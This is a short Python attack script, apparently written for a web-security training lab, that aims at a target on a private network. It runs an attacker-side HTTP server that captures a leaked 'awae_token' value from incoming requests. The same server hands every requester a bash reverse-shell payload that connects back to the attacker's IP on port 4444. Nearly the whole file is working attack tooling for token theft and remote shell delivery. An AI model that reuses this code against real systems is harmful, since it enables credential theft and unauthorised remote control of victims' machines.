import httpx
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

proxy = {
    "http://": "http://localhost:8080",
    "https://": "http://localhost:8080",
}

client = httpx.Client(
    verify=False,
    timeout=10.0,
    #proxies=proxy,
)

# Config
TARGET_IP = "192.168.151.123"
TARGET_PORT = "8000"
ATTACKER_IP = "192.168.45.209"
REVSHELL_PORT = "4444"
HTTPSERVER_PORT = "8000"
URL = f"http://{TARGET_IP}:{TARGET_PORT}/"

xss_flag = ""

class CustomHTTPHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        query_string = parse_qs(urlparse(self.path).query)
        if "awae_token" in query_string:
            global xss_flag
            xss_flag = query_string["awae_token"][0]
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(f"#!/bin/bash\n/bin/bash -i >& /dev/tcp/{ATTACKER_IP}/{REVSHELL_PORT} 0>&1".encode());

def run_background_http_server():
    server = HTTPServer((ATTACKER_IP, int(HTTPSERVER_PORT)), CustomHTTPHandler)
    executor = ThreadPoolExecutor()
    executor.submit(server.serve_forever)
    executor.shutdown(wait=False)

if __name__ == "__main__":
    run_background_http_server()
    res = client.get(f"{URL}?awae_token=test12345")
    print(res)
    #while True:
    #    if xss_flag != "":
    #        print(xss_flag)
